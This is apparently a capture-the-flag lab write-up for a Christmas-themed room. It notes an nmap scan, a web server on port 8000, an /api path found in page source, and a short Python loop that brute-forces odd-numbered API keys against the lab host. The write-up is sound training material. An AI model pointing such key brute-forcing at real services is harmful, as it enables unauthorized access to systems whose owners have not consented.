Let us start with a nmap scan

### What is the port number for the web server?

`8000`

### Without using enumerations tools such as Dirbuster, what is the directory for the API? (without the API key)

`/api`

looking at the source code of the `index.html` page we can find the api directory

### Where is Santa right now?

`Winter Wonderland, Hyde Park, London.`

We can bruteforce for the correct api key

```python
import requests

for x in range(1,100,2):
	url = "http://<ip>:8000/api/"+str(x)
	response = requests.get(url)
	print(x,": ",response.text	)
```
